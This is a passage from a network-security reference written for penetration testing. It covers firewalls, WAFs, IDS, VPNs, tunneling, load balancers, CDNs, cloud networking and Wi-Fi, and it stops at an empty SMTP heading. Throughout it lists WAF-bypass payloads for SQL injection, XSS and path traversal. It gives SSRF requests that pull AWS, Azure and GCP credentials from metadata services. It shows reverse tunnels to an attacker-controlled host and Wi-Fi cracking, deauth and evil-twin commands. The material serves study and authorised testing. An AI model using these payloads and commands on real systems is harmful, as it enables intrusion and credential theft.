Chain INPUT (policy DROP)
  ACCEPT  tcp  --  0.0.0.0/0  0.0.0.0/0   dpt:80
  ACCEPT  tcp  --  0.0.0.0/0  0.0.0.0/0   dpt:443
  ACCEPT  tcp  --  10.0.0.0/8 0.0.0.0/0   dpt:22
  DROP    all  --  0.0.0.0/0  0.0.0.0/0

Limitation: Can't tell SYN from established → too permissive or too restrictive
ACK scan (nmap -sA) bypasses: ACK packet allowed through as "established"
  
Fragment bypass:
  Tiny fragments split TCP header across multiple IP fragments
  Firewall may only inspect first fragment (has ports) — misses payload
  Modern firewalls reassemble before inspection
```

#### Stateful Inspection (Layer 4)
```
Tracks connection state in state table:
  Src IP, Dst IP, Src Port, Dst Port, State (SYN_SENT, ESTABLISHED, etc.)

Allows: Only return traffic for established outbound connections
Blocks: Unsolicited inbound connections

State table:
  192.168.1.10:52341 <-> 8.8.8.8:443  ESTABLISHED
  192.168.1.11:48821 <-> 203.0.113.5:80  ESTABLISHED
  
Attack: TCP session hijacking to inject into established session
  (harder in practice due to sequence numbers)
  
Attack: If firewall tracks state per packet only (some embedded):
  Send RST to remove state, then attack as if new connection
```

#### Next-Generation Firewall (NGFW — Layer 7)
```
Combines stateful + application awareness:
  - Deep Packet Inspection (DPI): examine payload content
  - Application ID: identify applications regardless of port
    (Skype over port 80, BitTorrent encrypted, etc.)
  - User identity: integrate with AD, LDAP
  - SSL/TLS inspection: decrypt, inspect, re-encrypt
  - Threat intelligence: block known-bad IPs, domains
  - Intrusion Prevention: IPS capability built-in
  
Vendors: Palo Alto, Fortinet, Check Point, Cisco Firepower, pfSense (community)

Bypass techniques:
  - Encrypted traffic (HTTPS): Only inspected if SSL inspection enabled (MITM)
  - Fragmentation: Some implementations reassemble poorly
  - Protocol confusion: Misclassify traffic
  - Timing attacks: Flood state table (session table exhaustion DoS)
  - IPv6 tunneling through IPv4 rules that don't handle IPv6
  - QUIC/HTTP3: Newer protocols may not be inspected
```

### iptables / nftables (Linux Firewall)

```
iptables Architecture:
  Tables: filter, nat, mangle, raw, security
  
  filter table chains:
    INPUT:    Packets destined for local machine
    FORWARD:  Packets routed through machine
    OUTPUT:   Packets originating from local machine

  nat table chains:
    PREROUTING:   Before routing decision (DNAT, redirect)
    POSTROUTING:  After routing decision (SNAT, MASQUERADE)
    OUTPUT:       Locally generated packets

Packet flow:
  Incoming:  NIC → PREROUTING → [routing] → INPUT → Process
  Forwarded: NIC → PREROUTING → [routing] → FORWARD → POSTROUTING → NIC
  Outgoing:  Process → OUTPUT → POSTROUTING → NIC

Common iptables commands:
  # View rules
  iptables -L -n -v --line-numbers
  iptables -t nat -L -n -v
  
  # Allow established connections
  iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
  
  # Rate limit SSH
  iptables -A INPUT -p tcp --dport 22 -m recent --set
  iptables -A INPUT -p tcp --dport 22 -m recent --update --seconds 60 --hitcount 4 -j DROP
  
  # Port knocking setup (source of obscurity)
  # DNAT (port forward)
  iptables -t nat -A PREROUTING -p tcp --dport 8080 -j DNAT --to-destination 192.168.1.10:80
  
  # MASQUERADE (SNAT for dynamic IP)
  iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```

### WAF (Web Application Firewall)

```
WAF Architecture Options:

1. Network-based (inline hardware):
   Internet → WAF appliance → Web server
   Examples: Imperva, F5 ASM, Barracuda
   
2. Host-based (agent on server):
   Runs as module on web server
   Examples: ModSecurity (Apache/Nginx), NAXSI (Nginx)
   
3. Cloud-based (reverse proxy):
   DNS points to WAF provider, which proxies to origin
   Examples: Cloudflare, AWS WAF, Akamai Kona

WAF Detection:
  # Fingerprint WAF
  wafw00f https://target.com
  
  # Manual: Send obviously malicious payload, observe response
  curl -H "X-Forwarded-For: '; DROP TABLE--" https://target.com/
  # WAF usually returns specific status code or page
  
WAF Bypass Techniques:

SQL Injection bypasses:
  WAF blocks: ' OR '1'='1
  Bypass with:
    Case variation:      ' oR '1'='1
    Comments:            '/**/OR/**/'1'='1
    Encoding:            %27%20OR%20%271%27%3D%271
    Double encoding:     %2527 (decoded to %27 = ')
    URL encoding mix:    ' OR%201=1--
    Unicode:             ' ＯＲ '1'='1 (fullwidth chars)
    Whitespace bypass:   '%09OR%091=1  (tab instead of space)
    MySQL specifics:     '/*!50000OR*/'1'='1
    Concat bypass:       ' OR CONCAT('1','1')='11
    
XSS bypasses:
  WAF blocks: <script>alert(1)</script>
  Bypass:
    Tag case: <ScRiPt>alert(1)</ScRiPt>
    Attribute: <img src=x onerror=alert(1)>
    SVG: <svg onload=alert(1)>
    Protocol: <a href="javascript:alert(1)">click</a>
    Data URI: <img src="data:text/html,<script>alert(1)</script>">
    Event handlers: <body onpageshow=alert(1)>
    CSS expression: <style>@import 'javascript:alert(1)'</style>
    
Path traversal bypass:
  WAF blocks: ../
  Bypass:
    URL encode:    %2e%2e%2f
    Double encode: %252e%252e%252f
    Unicode:       ..%c0%af  (overlong encoding)
    Null byte:     ../../../etc/passwd%00.jpg
    Variations:    ....//  or  ..\/  or  ..\..\ 
    
Content-Type bypass:
  WAF inspects JSON body but not XML:
  Change: Content-Type: application/json
  To:     Content-Type: application/xml
  Send XML body with payload (XXE or injection in XML)
  
Chunked encoding bypass:
  Split payload across chunks so no chunk contains the full signature:
  POST /search HTTP/1.1
  Transfer-Encoding: chunked
  
  3
  sel
  3
  ect
  0
  
HTTP header injection in WAF bypass:
  Add: X-Original-URL: /admin
  Add: X-Rewrite-URL: /admin
  Some WAFs/apps use these headers → bypass front-end access control
```

### IDS/IPS

```
IDS (Intrusion Detection System):
  Passive — monitors and alerts, does not block
  
IPS (Intrusion Prevention System):
  Active — can block in real-time (inline deployment)

Detection Methods:

Signature-based:
  Pattern matching against known attack signatures
  Fast, low false positives, blind to zero-days
  
Anomaly-based (behavioral):
  Baseline normal traffic, alert on deviations
  Detects novel attacks, higher false positive rate
  Machine learning increasingly used

Protocol analysis:
  Verify traffic conforms to RFC specifications
  
Deployment modes:
  Network IDS (NIDS): Monitors network traffic
  Host IDS (HIDS): Monitors system calls, log files, file integrity
  
Open source: Snort, Suricata, Zeek (Bro)
Commercial: Cisco Firepower, Darktrace, CrowdStrike, Vectra AI

IDS Evasion:
  Fragmentation: Split attack payload across IP fragments
  TTL manipulation: Craft TTLs so IDS sees fragment but host doesn't (or vice versa)
  Polymorphic payloads: Encode shellcode differently each time
  Timing: Slow scan to avoid rate-based detection
  Decoy traffic: Mix attack with legitimate traffic patterns
  Protocol confusion: Use non-standard port for known protocol
  
  # Slow scan (evasion by timing)
  nmap --scan-delay 10s target.com
  
  # Fragmentation
  nmap -f target.com              # 8-byte fragments
  nmap --mtu 24 target.com        # Custom MTU
  
  # Decoys (mix in fake source IPs)
  nmap -D 10.0.0.1,10.0.0.2,ME target.com
```

---

## 17. VPNs and Tunneling Protocols

### VPN Fundamentals

VPN creates an encrypted "tunnel" over a public network, making it appear as if you're on the private network.

```
Without VPN:
Client ----[Internet (cleartext or TLS)]----> Server

With VPN:
Client --> [Encrypt] --> VPN Tunnel --> [Decrypt] --> Internal Network --> Server
             \___________________________________/
             Appears as single encrypted connection to outside observer
```

### IPSec

IPSec operates at Layer 3 — encrypts IP packets.

```
IPSec Modes:
  Transport Mode:  Only encrypts payload, original IP header visible
  Tunnel Mode:     Encrypts entire original packet, adds new IP header
  
  Transport:  [IP header][IPSec header][Encrypted payload]
  Tunnel:     [New IP hdr][IPSec header][Encrypted: IP hdr + payload]

IPSec Protocols:
  AH (Authentication Header, IP protocol 51):
    Provides integrity and authentication
    Does NOT encrypt payload
    Incompatible with NAT (covers IP header in HMAC, NAT changes IP)
    
  ESP (Encapsulating Security Payload, IP protocol 50):
    Provides confidentiality (encryption), integrity, authentication
    NAT-compatible (can work with NAT-T on UDP port 4500)
    Most commonly used

IKE (Internet Key Exchange) — Phase 1 & 2:
  
  Phase 1 (IKE SA — management tunnel):
    Negotiate: encryption (AES), hash (SHA), DH group
    Establish IKE Security Association
    Modes: Main Mode (6 messages) or Aggressive Mode (3 messages, less secure)
    
  Phase 2 (IPSec SA — data tunnel):
    Negotiate IPSec parameters (ESP/AH, encryption, hash)
    Establish IPSec SAs (one per direction)
    
IKEv2 (modern):
  Fewer messages, better NAT traversal, MOBIKE (mobility)
  More resistant to DoS

Security issues:
  Aggressive Mode: Hash sent in cleartext → offline dictionary attack
  Weak pre-shared keys → brute force
  IKEv1 flaws: various MITM and downgrade
  
  # Scan for IKE
  ike-scan target.com
  # Test for aggressive mode
  ike-scan --aggressive target.com
```

### OpenVPN

```
OpenVPN: SSL/TLS-based VPN (Layer 2 or 3)
  - Uses TLS for control channel
  - Uses UDP or TCP for transport (default UDP 1194)
  - Can run over port 443 (bypasses many firewalls)
  - Uses tun (Layer 3) or tap (Layer 2) virtual interfaces
  
Handshake:
  TLS handshake (mutual auth with certs or PSK)
  Custom OpenVPN protocol over TLS
  
Security: Generally very secure if configured properly
Issues:
  - Outdated configs using BF-CBC (Blowfish, 64-bit block → SWEET32 attack)
  - No TLS auth (--tls-auth) → DoS via unauthenticated TLS handshakes
  - Static key mode → no forward secrecy
```

### WireGuard

```
Modern, minimal VPN protocol (in Linux kernel since 5.6)
  - Only ~4000 lines of code (vs OpenVPN's 100,000)
  - ChaCha20 + Poly1305 for encryption
  - Curve25519 for ECDH key exchange
  - BLAKE2s for hashing
  - No negotiation — configuration specifies all cryptography
  - UDP only (default port 51820)
  - Stateless protocol (no handshake in traditional sense)

Handshake (4 messages):
  Initiator → Responder: Initiation message
  Responder → Initiator: Response message
  [Both derive session keys]
  Data packets start flowing immediately

WireGuard packet:
  +--------+------------------+------------------+
  |  Type  | Sender Index     |   Encrypted      |
  | 1 byte |   4 bytes        |   Payload        |
  +--------+------------------+------------------+
  | Receiver Nonce (8 bytes) |                   |
  +--------------------------+                   |
  | Poly1305 Auth Tag (16B)  |                   |
  +--------------------------------------------------+

Security properties:
  - Forward secrecy per session
  - Identity hiding (initiator sends ephemeral key first)
  - Minimal attack surface
  - Silent drop for unauthorized packets (no response → no enumeration)
```

### SSH Tunneling

```
Local Port Forward:
  ssh -L local_port:remote_host:remote_port user@jump_host
  
  Example: Access internal web server via bastion
  ssh -L 8080:internal-web.corp:80 user@bastion.corp.com
  → Browse http://localhost:8080 → traffic goes through SSH to internal-web.corp:80
  
  Tunnel:
  [Localhost:8080] → SSH Tunnel → [bastion] → [internal-web.corp:80]

Remote Port Forward (reverse tunnel):
  ssh -R remote_port:local_host:local_port user@remote_host
  
  Example: Expose internal machine to internet (for pentesting)
  ssh -R 9090:localhost:80 user@vps.attacker.com
  → vps.attacker.com:9090 → SSH tunnel → localhost:80
  
  Use case: Receive reverse shell callbacks through NAT

Dynamic Port Forward (SOCKS proxy):
  ssh -D 1080 user@bastion.corp.com
  → Creates SOCKS5 proxy on localhost:1080
  → Route all tool traffic through bastion
  
  # Use with proxychains
  proxychains nmap -sT -Pn 192.168.1.0/24
  
  # Use with curl
  curl --socks5 127.0.0.1:1080 http://internal.corp.com/

SSH Jump Host:
  ssh -J bastion.corp.com user@internal.corp.com
  → Connect to internal.corp.com via bastion without explicit port forward

SSH Config shortcuts:
  # ~/.ssh/config
  Host bastion
    HostName bastion.corp.com
    User ubuntu
    IdentityFile ~/.ssh/bastion_key
    
  Host internal
    HostName 10.0.1.50
    User ubuntu
    ProxyJump bastion
```

### Protocol Tunneling

```
DNS Tunneling:
  Encode data in DNS queries (see DNS section)
  Bypass: Firewalls that allow DNS but block all other outbound
  
HTTP/HTTPS Tunneling:
  Wrap arbitrary protocol inside HTTP requests
  Tools: HTTPtunnel, chisel, reGeorg (for SSRF pivot)
  
  chisel:
    # Server (attacker controlled)
    chisel server -p 8080 --reverse
    
    # Client (compromised host)
    chisel client attacker.com:8080 R:1080:socks
    → Creates reverse SOCKS tunnel through HTTP
    
ICMP Tunneling:
  Embed data in ICMP Echo payload
  Bypass: Networks that allow ICMP but block TCP/UDP
  Tools: ptunnel-ng, icmptunnel
  
  ICMP Echo has 8+ bytes of data field — usable for covert channel
  Max throughput: ~64KB/s (rate limited by ICMP handling)
```

---

## 18. Load Balancers and Reverse Proxies

### Load Balancer Architecture

```
Internet
    |
    v
[Load Balancer]  (single entry point)
   /    |    \
[App1] [App2] [App3]  (backend pool)

Layer 4 LB (TCP/UDP):
  - Routes based on IP:port
  - Doesn't inspect application payload
  - Lower latency, less CPU
  - Can't do SSL termination (sends raw TCP to backends)
  - Examples: AWS NLB, HAProxy (TCP mode)

Layer 7 LB (HTTP):
  - Parses HTTP, routes based on URL, headers, cookies
  - SSL termination — decrypts at LB, HTTP to backends (or re-encrypt)
  - Content-based routing: /api/* → API servers, /static/* → CDN
  - Session persistence (sticky sessions)
  - Examples: AWS ALB, Nginx, HAProxy (HTTP mode)

Load Balancing Algorithms:
  Round Robin:       Rotate through backends sequentially
  Weighted RR:       More capable servers get more traffic
  Least Connections: Route to server with fewest active connections
  IP Hash:           Hash src IP → deterministic backend (sticky)
  Random:            Random backend selection
  Least Response:    Route to fastest-responding backend
```

### Sticky Sessions (Session Persistence)

```
Problem: Stateful app (sessions in memory) — user must return to same server

Solutions:
  1. Cookie-based persistence:
     LB inserts cookie: AWSALB=server1_identifier
     Subsequent requests → same backend
     
  2. IP-based persistence:
     Hash src IP → always same backend
     Breaks with NAT (multiple users from same IP → same server)
     
  3. URL rewriting:
     Embed server ID in URL: /;jsessionid=...
     
Security implications:
  - Predictable session cookie → server enumeration
  - Different backends may have different security configs
  - IDOR: user A's session might be on server1, attacker's on server2 — race conditions
  - Load balancer errors reveal backend count/type
  
  # Detect sticky session cookies
  curl -v https://target.com 2>&1 | grep -i 'set-cookie'
  # Look for: AWSALB, AWSALBCORS (AWS ALB), ASP.NET_SessionId server mapping
```

### Health Checks

```
LB sends health probes to backends:
  HTTP: GET /health → expect 200
  TCP: TCP connect → success if accepted
  
Security implications:
  /health endpoint may expose sensitive info:
    - DB connection status
    - Dependency versions
    - Internal service URLs
    - Memory/CPU stats
    
  Test: curl https://target.com/health
         curl https://target.com/healthz
         curl https://target.com/status
         curl https://target.com/ping
         curl https://target.com/actuator/health  (Spring Boot)
```

### Reverse Proxy Security Issues

```
Host Header Attacks:
  Reverse proxy receives: Host: target.com → forwards to backend
  
  Attack 1 — Host header injection:
    Proxy forwards custom Host header to backend
    Backend uses Host in password reset email link:
    "Click https://attacker.com/reset?token=..."
    
  Attack 2 — Cache poisoning:
    Poison cache with malicious Host header
    Other users served attacker-controlled content
    
  Attack 3 — SSRF via Host header:
    Host: internal.corp.com → proxy forwards to internal backend
    
  Testing:
    curl -H "Host: attacker.com" https://target.com/reset-password
    curl -H "X-Forwarded-Host: attacker.com" https://target.com/

X-Forwarded-For Manipulation:
  LB adds: X-Forwarded-For: [real client IP]
  
  If backend trusts XFF without validation:
    curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin
    → Backend sees request as coming from localhost → admin access
    
    curl -H "X-Forwarded-For: 192.168.1.1" → access from internal IP
    curl -H "X-Real-IP: 10.0.0.1" → bypass IP-based restrictions

Backend Bypass (direct backend access):
  If you can find backend IP (server headers, DNS, Shodan, cert lookup):
    Direct access bypasses WAF, LB, and any access controls
    
  # Find origin IP behind Cloudflare
  # Method 1: Historical DNS (before Cloudflare)
  # Method 2: SSL cert on origin IP
  shodan search "ssl:target.com"
  # Method 3: SSRF to internal, then look at backend headers
  # Method 4: subdomain not behind CF (mail.target.com, vpn.target.com)
  
  # Test direct access
  curl -H "Host: target.com" https://[backend-IP]/
```

---

## 19. CDNs and Edge Networks

### CDN Architecture

```
Without CDN:
  All users → Origin server (one location, high latency globally)

With CDN:
  Users → Nearest Edge PoP (Point of Presence) → Cached content
                                                    (or) → Origin (cache miss)

CDN Functions:
  - Static content caching (images, CSS, JS)
  - Dynamic content acceleration (Anycast routing)
  - DDoS mitigation (absorb attack at edge)
  - WAF at edge
  - SSL/TLS termination at edge
  - Geo-blocking
  - Bot management

Major CDNs: Cloudflare, Akamai, Fastly, AWS CloudFront, Azure CDN, Google Cloud CDN

How CDN routing works:
  Anycast: Multiple PoPs share same IP
  DNS-based: Return nearest PoP IP via geoDNS (low TTL, ~60s)
  
  User in London → DNS resolves to London PoP IP
  User in Singapore → DNS resolves to Singapore PoP IP
```

### CDN Caching — Security Implications

```
Cache Keys:
  CDN caches based on: URL (usually) + sometimes Vary headers
  
Cache Poisoning Attack:
  Goal: Get CDN to cache malicious response and serve it to all users
  
  Method 1 — Unkeyed input poisoning:
    CDN doesn't include some header in cache key, but backend uses it
    
    Send: GET / HTTP/1.1
          Host: target.com
          X-Forwarded-Host: attacker.com     ← not in cache key
    
    Backend responds with attacker.com in Location/Content
    CDN caches this response → all users get attacker-controlled content
    
  Method 2 — Fat GET (body in GET request):
    GET / HTTP/1.1
    [body with payload]
    
    Some backends process GET body, CDN caches based on URL only
    
  Method 3 — Cache key normalization:
    GET /index.php?x=1 and GET /index.php?x=1&y=2
    May normalize to same cache key but different backend responses
    
  Detection tools:
    param-miner (Burp extension) — find unkeyed parameters/headers
    
  Testing:
    Add unique parameter: ?cb=uniquevalue123
    Add X-Forwarded-Host, X-Host, X-Forwarded-Server headers
    Check if response reflects injected value
    
Cache Deception Attack:
  Trick CDN into caching sensitive content
  
  Request: GET /profile/settings.css HTTP/1.1
  
  If CDN caches all .css files:
    Server ignores .css extension, serves /profile/settings
    CDN caches the response under /profile/settings.css
    Attacker requests /profile/settings.css → gets victim's profile data
    
  Variations: /account.jpg, /dashboard.gif, /admin.js
```

### Cloudflare-Specific Research

```
Identify Cloudflare:
  - CF-Ray header in response
  - Cloudflare ASN (AS13335)
  - 1.1.1.1, 1.0.0.1 for DNS resolver

Cloudflare bypass methods:
  1. Find origin IP (see section 18)
  2. Subdomain not behind CF
  3. SPF/MX record reveals origin IP
  4. Direct mail to mx.target.com → mx server in same range as origin
  5. Cloud metadata SSRF → get internal/origin IP
  6. Old DNS records in SecurityTrails, RiskIQ PassiveTotal

Cloudflare WAF:
  Rules: OWASP CRS + Cloudflare custom
  Bypass: cloudflare-bypasses GitHub repos, encoding techniques
  
  # Check WAF rule sets
  # Cloudflare's managed rules are publicly documented
  # Rule IDs can be referenced when reporting bypass

Cloudflare Workers (Edge Computing):
  JavaScript running at edge PoPs
  Can introduce misconfigurations:
    - Auth logic in workers that can be bypassed
    - SSRF via fetch() in worker code
    - Business logic flaws at edge
```

---

## 20. Cloud Network Architecture

### AWS VPC (Virtual Private Cloud)

```
AWS Region
└── VPC (10.0.0.0/16)
    ├── Availability Zone A (us-east-1a)
    │   ├── Public Subnet (10.0.1.0/24)
    │   │   ├── EC2 (public IP + private IP)
    │   │   └── NAT Gateway
    │   └── Private Subnet (10.0.2.0/24)
    │       └── EC2 (private IP only)
    ├── Availability Zone B (us-east-1b)
    │   ├── Public Subnet (10.0.3.0/24)
    │   └── Private Subnet (10.0.4.0/24)
    ├── Internet Gateway (IGW) — connects VPC to internet
    ├── Route Tables
    │   ├── Public RT: 0.0.0.0/0 → IGW
    │   └── Private RT: 0.0.0.0/0 → NAT Gateway
    ├── Security Groups (stateful, instance-level firewall)
    ├── Network ACLs (stateless, subnet-level firewall)
    └── VPC Flow Logs (network traffic metadata logging)

Internet Gateway (IGW):
  - Provides internet connectivity for VPC
  - Performs NAT for instances with public IPs
  - Stateless, horizontally scalable

NAT Gateway:
  - Allows private subnet instances to reach internet
  - Blocks unsolicited inbound from internet
  - Managed service (vs NAT Instance — EC2 doing NAT)

Security Groups (SG):
  - Stateful: allow return traffic automatically
  - Applied per ENI (Elastic Network Interface)
  - Default: deny all inbound, allow all outbound
  - Rules: source can be IP, CIDR, or another SG
  - Source SG rule: "Allow port 3306 from sg-webapp" → only webapp SG can reach DB

Network ACLs (NACL):
  - Stateless: must allow both inbound AND outbound explicitly
  - Applied at subnet boundary
  - Rules evaluated in order (numbered)
  - Default NACL: allow all (different from SG default!)
  - Custom NACL: deny all by default
```

### AWS Network Attack Surface

```
Common misconfigurations:
  
1. S3 Bucket Public Access:
   - Bucket policy allows s3:GetObject to Principal: "*"
   - List accessible objects: aws s3 ls s3://bucket-name --no-sign-request
   - Access files: aws s3 cp s3://bucket/file.txt . --no-sign-request
   
2. EC2 Metadata Service (IMDS):
   - Available at 169.254.169.254 from any EC2 instance
   - IMDSv1: no auth required (curl http://169.254.169.254/latest/meta-data/)
   - IMDSv2: requires PUT request first to get token (session-oriented)
   
   SSRF to IMDS (IMDSv1):
     # In SSRF vulnerability:
     http://169.254.169.254/latest/meta-data/
     http://169.254.169.254/latest/meta-data/iam/security-credentials/
     http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
     # Returns: AccessKeyId, SecretAccessKey, Token (temporary credentials!)
     
   # Use stolen credentials:
   aws configure --profile stolen
   aws sts get-caller-identity --profile stolen
   aws s3 ls --profile stolen
   
3. Security Group misconfigurations:
   - 0.0.0.0/0 inbound on port 22 (SSH from any IP)
   - 0.0.0.0/0 inbound on port 3389 (RDP from any IP)
   - 0.0.0.0/0 inbound on all ports (wildcard rule)
   
4. VPC Peering without route table restrictions:
   - Two VPCs peered → if one compromised, can pivot to other
   - Transitive peering not supported (A↔B↔C doesn't give A→C) — but direct full mesh does
   
5. Exposed internal services:
   - Elasticsearch on 9200 with no auth and public SG
   - Redis on 6379 publicly accessible
   - Kubernetes dashboard exposed
   
6. Misconfigured ALB:
   - HTTPS redirect not configured (HTTP available)
   - ALB rules don't restrict access to sensitive paths
   - Target group has instances not meant to be public

AWS-specific recon:
  # Enumerate DNS
  aws s3api list-buckets --query 'Buckets[].Name' (if creds available)
  
  # Find exposed buckets via search
  # Google: site:s3.amazonaws.com "target"
  # grep for S3 bucket names in JS files
  
  # CloudTrail for activity (if auditing)
  aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=ConsoleLogin
  
  # Enumerate with Pacu (AWS exploitation framework)
  pacu
  > import_keys --all
  > run iam__bruteforce_permissions
  > run ec2__enum
```

### Azure Network Architecture

```
Azure Network Hierarchy:
  Subscription
  └── Resource Group
      └── Virtual Network (VNet: 10.0.0.0/16)
          ├── Subnet (10.0.1.0/24)
          │   ├── NSG (Network Security Group)
          │   └── VMs
          └── Subnet (10.0.2.0/24)
              └── Azure SQL

Azure-specific components:
  NSG (Network Security Group):
    - Similar to AWS Security Groups but can apply to NIC or subnet
    - Stateful
    - Default rules: Allow VNet inbound/outbound, Allow Azure LB, Deny all else
    
  Azure Load Balancer: Layer 4
  Azure Application Gateway: Layer 7 (with WAF)
  Azure Front Door: Global CDN + WAF + LB
  Azure Firewall: Cloud-native managed firewall (Layer 7)
  
Azure Metadata:
  http://169.254.169.254/metadata/instance?api-version=2021-02-01
  Headers required: Metadata: true
  
  # SSRF payload:
  GET http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com/
  Header: Metadata: true
  → Returns Azure managed identity OAuth token!
```

### GCP Network Architecture

```
GCP Network:
  Project
  └── VPC Network (global, not regional like AWS)
      ├── Subnet (regional)
      └── Firewall Rules (global, tag-based)

GCP Metadata:
  http://metadata.google.internal/computeMetadata/v1/
  http://169.254.169.254/computeMetadata/v1/
  Header required: Metadata-Flavor: Google
  
  # Service account token via SSRF:
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
  
  # Get scopes:
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes

GCP-specific attack vectors:
  - GCS bucket public access
  - Compute Engine metadata (no auth in some old configs)
  - GKE (Kubernetes) metadata server
  - Workload Identity misconfigurations
```

---

## 21. Wireless Network Architecture

### 802.11 Wi-Fi Standards

```
Standard  Frequency  Max Speed  Range
802.11a   5 GHz      54 Mbps    ~35m indoor
802.11b   2.4 GHz    11 Mbps    ~35m indoor
802.11g   2.4 GHz    54 Mbps    ~38m indoor
802.11n   2.4/5 GHz  600 Mbps   ~70m indoor  (Wi-Fi 4)
802.11ac  5 GHz      3.5 Gbps   ~35m indoor  (Wi-Fi 5)
802.11ax  2.4/5/6GHz 9.6 Gbps   ~30m indoor  (Wi-Fi 6)
802.11be  2.4/5/6GHz 46 Gbps    (Wi-Fi 7, emerging)

2.4 GHz channels (US):
  1    2    3    4    5    6    7    8    9    10   11
  |----|----|----|----|----|----|----|----|----|----|----|
  Non-overlapping: 1, 6, 11
  
5 GHz: Many non-overlapping channels (20, 40, 80, 160 MHz wide)
6 GHz: Wi-Fi 6E — new spectrum, less congestion
```

### Wi-Fi Security Protocols

```
WEP (Wired Equivalent Privacy) — BROKEN:
  RC4 stream cipher with 24-bit IV (too short)
  IV reuse is inevitable → keystream recovery
  Crack with: aircrack-ng (need ~40,000 IVs)
  Time to crack: minutes with passive capture
  
WPA (Wi-Fi Protected Access) — VULNERABLE:
  TKIP (Temporal Key Integrity Protocol) — RC4-based
  Improved IV (48-bit) but still RC4 with TKIP
  TKIP cracking possible in some scenarios
  
WPA2 — Current standard:
  CCMP (Counter Mode CBC-MAC Protocol) — AES-based
  Much stronger than WEP/WPA
  
  Two modes:
    WPA2-Personal (PSK): Pre-shared key
    WPA2-Enterprise: 802.1X + RADIUS server authentication
    
  WPA2-Personal attacks:
    1. 4-way handshake capture → offline dictionary attack
    2. PMKID attack (no handshake needed)
    
  4-Way Handshake:
    AP ---[ANonce]---> Client         M1: Authenticator Nonce
    Client ---[SNonce + MIC]---> AP   M2: Supplicant Nonce + MIC
    AP ---[GTK + MIC]---> Client      M3: Group Temporal Key
    Client ---[MIC]---> AP            M4: Confirm
    
    PTK (Pairwise Transient Key) = PRF(PMK, ANonce, SNonce, AP_MAC, Client_MAC)
    MIC = HMAC over message using PTK
    
    Capture M1+M2, then brute-force: PMK = PBKDF2(passphrase, SSID, 4096, 32)
    PTK derivable from PMK → verify MIC match
    
    aircrack-ng -w wordlist.txt capture.cap
    hashcat -m 22000 capture.hc22000 wordlist.txt  # WPA2 mode
    
  PMKID Attack (2018, Jens Steube):
    PMKID = HMAC-SHA1(PMK, "PMK Name" || AP_MAC || Client_MAC)
    AP sends PMKID in first EAPOL frame (M1)
    No need to capture full handshake or wait for client to connect
    
    hcxdumptool -i wlan0 -o capture.pcapng --enable_status=1
    hcxpcapngtool -o hash.hc22000 capture.pcapng
    hashcat -m 22000 hash.hc22000 wordlist.txt
    
WPA3 — Modern:
  SAE (Simultaneous Authentication of Equals) replaces PSK
  Dragonfly handshake — forward secrecy even with PSK
  Resistant to offline dictionary attacks
  
  WPA3 attacks:
    Downgrade to WPA2 (transition mode)
    DragonBlood (2019): Side-channel attacks on SAE handshake
    Implementation bugs in specific vendors
```

### Wireless Attack Techniques

```
Evil Twin / Rogue AP:
  Create AP with same SSID as target
  More powerful signal → clients connect to attacker
  Full MitM for all traffic
  
  hostapd-wpe (Wireless Pwnage Edition):
    Creates evil twin
    Captures PEAP/EAP credentials
    Cracks MS-CHAPv2 offline
    
  EAPHammer:
    git clone https://github.com/s0lst1c3/eaphammer
    ./eaphammer -i wlan0 --channel 6 --auth wpa-eap --essid "Corporate WiFi" --creds

Deauthentication Attack:
  802.11 management frames are unencrypted (pre-802.11w)
  Send deauth frames spoofing AP MAC → disconnect clients
  Force clients to reconnect → capture handshake
  
  aireplay-ng -0 10 -a [AP_MAC] -c [Client_MAC] wlan0
  # -0 = deauth, 10 = times, -a = AP, -c = client (optional, broadcast if omitted)
  
802.1X / EAP Attacks:
  Enterprise WPA2 uses RADIUS authentication
  EAP-PEAP/MS-CHAPv2: Most common
  
  Attack: Present fake RADIUS cert (often accepted without validation)
  Capture: EAP identity + MS-CHAPv2 challenge/response
  Crack: asleap, hashcat mode 5500 (NetNTLMv1 / MS-CHAPv2)
  
Karma Attack:
  Client probes for known networks (Preferred Network List)
  Rogue AP responds to ALL probe requests claiming to be any SSID
  Client connects automatically
  
  Tools: hostapd-karma, WiFi Pineapple (commercial), MANA toolkit
  
WPS (Wi-Fi Protected Setup) Attack:
  WPS PIN: 8 digits, but verified in two halves (4+4)
  Actually only 10^4 + 10^3 = 11,000 combinations (not 10^8)
  
  Reaver: brute forces WPS PIN in hours
  Pixie Dust: offline attack on weak random number generation
  
  reaver -i wlan0 -b [AP_MAC] -vv
  reaver -i wlan0 -b [AP_MAC] -K 1  # Pixie Dust mode
```

---

## 22. Network Protocols Reference

### DHCP

```
DHCP (Dynamic Host Configuration Protocol) — UDP 67 (server), 68 (client)

DORA Process:
Client                                DHCP Server
  |                                        |
  |---DISCOVER (broadcast)---------------->|  "Anyone out there? I need an IP"
  |   Src: 0.0.0.0:68, Dst: 255.255.255.255:67
  |                                        |
  |<--OFFER (broadcast or unicast)---------|  "I offer you 192.168.1.50"
  |   IP: 192.168.1.50, Mask, Gateway, DNS |
  |   Lease time: 86400s                   |
  |                                        |
  |---REQUEST (broadcast)----------------->|  "I want 192.168.1.50 please"
  |   (broadcast so other servers know)    |
  |                                        |
  |<--ACK (broadcast or unicast)-----------|  "Confirmed, it's yours for 24h"
  |                                        |

DHCP Packet contains:
  ciaddr: Client IP (0.0.0.0 if unknown)
  yiaddr: Your (client's) IP (offered/assigned)
  siaddr: Server IP
  giaddr: Gateway IP (relay agent)
  chaddr: Client hardware (MAC) address
  Options: Subnet mask, Router, DNS, Lease time, etc.
  
DHCP Attacks:
  
  DHCP Starvation:
    Flood server with DISCOVER from random MACs
    Exhaust IP pool → Deny of Service (no IPs for legit clients)
    Then serve own rogue DHCP server
    
  Rogue DHCP Server:
    Respond to DISCOVER faster than legit server
    Provide attacker-controlled: Gateway (MitM), DNS (phishing)
    
  DHCP Snooping (mitigation):
    Switch feature: only allow DHCP responses from trusted ports
    Builds binding table: MAC+IP+Port
    Dynamic ARP Inspection uses this table to validate ARP
```

### SMTP

```
